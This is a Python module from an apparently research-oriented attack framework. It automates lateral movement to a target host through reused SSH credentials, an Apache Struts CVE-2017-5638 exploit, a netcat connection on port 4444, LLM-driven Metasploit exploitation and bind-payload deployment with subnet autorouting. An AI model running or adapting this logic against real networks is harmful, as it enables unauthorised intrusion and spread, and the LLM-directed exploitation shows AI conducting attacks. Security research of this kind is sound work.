from incalmo.core.models.events import Event, InfectedNewHost
from incalmo.core.models.network import Host
from incalmo.core.services import (
    LowLevelActionOrchestrator,
    EnvironmentStateService,
    AttackGraphService,
)
from incalmo.core.services.action_context import HighLevelContext

from ..high_level_action import HighLevelAction
from .llm_agents.msf_lateral_movement.llm_ms_lateral_move import (
    LLMLateralMoveMetasploit,
)
from ..LowLevel import (
    ExploitStruts,
    SSHLateralMove,
    NCLateralMove,
    RunMetasploitBindFile,
    MsfRpcCommand,
)


class LateralMoveToHost(HighLevelAction):
    def __init__(
        self,
        host_to_attack: Host,
        attacking_host: Host,
        stop_after_success: bool = True,
    ):
        super().__init__()
        self.host_to_attack = host_to_attack
        self.attacking_host = attacking_host
        self.stop_after_success = stop_after_success

    async def _connect_via_bind(
        self,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        ip_address: str,
        context: HighLevelContext,
    ) -> None:
        """Connect msfrpcd (on Kali) to the bind listener the just-run
        RunMetasploitBindFile opened on the newly-infected host, then autoroute
        its subnet. Dispatched to run ON Kali via MsfRpcCommand, exactly like
        LLMLateralMoveMetasploit's own msf calls: the harness host can't reach
        Kali's 127.0.0.1-only msfrpcd, so the old direct
        MetasploitService.connect_to_session_via_bind() call from here always
        failed (see msf_rpc_client.py's docstring). Dispatch target is the
        attacking host's agent — Kali, where msfrpcd runs — mirroring
        llm_ms_lateral_move's source_agent."""
        agent = self.attacking_host.get_agent()
        if agent is None:
            print(
                "LateralMoveToHost: no attacking-host agent to dispatch the msf "
                "bind-connect — skipping session bind."
            )
            return
        cmd = MsfRpcCommand(
            agent, "connect_to_session_via_bind", {"ip_address": ip_address}
        )
        await low_level_action_orchestrator.run_action(cmd, context)

    async def run(
        self,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        environment_state_service: EnvironmentStateService,
        attack_graph_service: AttackGraphService,
        context: HighLevelContext,
    ) -> list[Event]:
        """
        _random_lateral_move
        @brief: randomly chooses a host to attack and randomly chooses a port to attack on that host.
                Then, it sets up the lateral move link and runs it.
        """
        events = []

        # A caller can hand us a host that isn't in the environment state — e.g. a
        # state-machine strategy targeting a hardcoded IP that a flaky/aggressive
        # ping sweep never discovered (or a subnet it never scanned). There is
        # nothing to move to or from, so return cleanly instead of dereferencing
        # None (.ssh_config / .ip_addresses / .open_ports below).
        if self.host_to_attack is None or self.attacking_host is None:
            print("LateralMoveToHost: attacking or target host is None — skipping.")
            return events

        # Check if attacking host has credentials
        if len(self.attacking_host.ssh_config) > 0:
            for cred in self.attacking_host.ssh_config:
                if cred.host_ip in self.host_to_attack.ip_addresses:
                    agent = cred.agent_discovered
                    new_events = await low_level_action_orchestrator.run_action(
                        SSHLateralMove(agent, cred.hostname), context
                    )
                    for event in new_events:
                        if type(event) is InfectedNewHost:
                            event.credential_used = cred
                            if context.llm_interface:
                                events += (
                                    await low_level_action_orchestrator.run_action(
                                        RunMetasploitBindFile(event.new_agent)
                                    )
                                )
                                await self._connect_via_bind(
                                    low_level_action_orchestrator,
                                    event.new_agent.host_ip_addrs[0],
                                    context,
                                )

                    if len(new_events) > 0:
                        events += new_events
                        if self.stop_after_success:
                            return events

        # Try to exploit a service
        agent = self.attacking_host.get_agent()
        if not agent:
            print(
                f"No agent found on attacking host {self.attacking_host.ip_addresses}, cannot perform lateral move."
            )
            return events

        for (
            port_to_attack,
            service_to_attack,
        ) in self.host_to_attack.open_ports.items():
            action_to_run = None

            if service_to_attack.CVE and self.host_to_attack.has_an_ip_address():
                # Can only be used when using LLM strategies
                print(
                    f"Service {service_to_attack} on host {self.host_to_attack.ip_addresses} has CVEs: {service_to_attack.CVE}"
                )
                if context.llm_interface:
                    new_events = await LLMLateralMoveMetasploit(
                        self.attacking_host,
                        self.host_to_attack,
                        service_to_attack.CVE[0],
                        service_to_attack.port,
                        context.llm_interface,
                    ).run(
                        low_level_action_orchestrator,
                        environment_state_service,
                        attack_graph_service,
                        context,
                    )
                    for event in new_events:
                        if type(event) is InfectedNewHost:
                            events += await low_level_action_orchestrator.run_action(
                                RunMetasploitBindFile(event.new_agent)
                            )
                            await self._connect_via_bind(
                                low_level_action_orchestrator,
                                event.new_agent.host_ip_addrs[0],
                                context,
                            )
                    if len(new_events) > 0:
                        events += new_events
                        if self.stop_after_success:
                            return events
                elif "CVE-2017-5638" in service_to_attack.CVE:
                    action_to_run = ExploitStruts(
                        agent,
                        self.host_to_attack.get_ip_address(),
                        str(port_to_attack),
                    )
            elif port_to_attack == 4444 and self.host_to_attack.has_an_ip_address():
                action_to_run = NCLateralMove(
                    agent,
                    self.host_to_attack.get_ip_address(),
                    str(port_to_attack),
                )

            if action_to_run is None:
                continue

            new_events = await low_level_action_orchestrator.run_action(
                action_to_run, context
            )

            if context.llm_interface:
                for event in new_events:
                    if type(event) is InfectedNewHost:
                        events += await low_level_action_orchestrator.run_action(
                            RunMetasploitBindFile(event.new_agent)
                        )
                        await self._connect_via_bind(
                            low_level_action_orchestrator,
                            event.new_agent.host_ip_addrs[0],
                            context,
                        )

            if len(new_events) > 0:
                events += new_events
                if self.stop_after_success:
                    return events

        return events
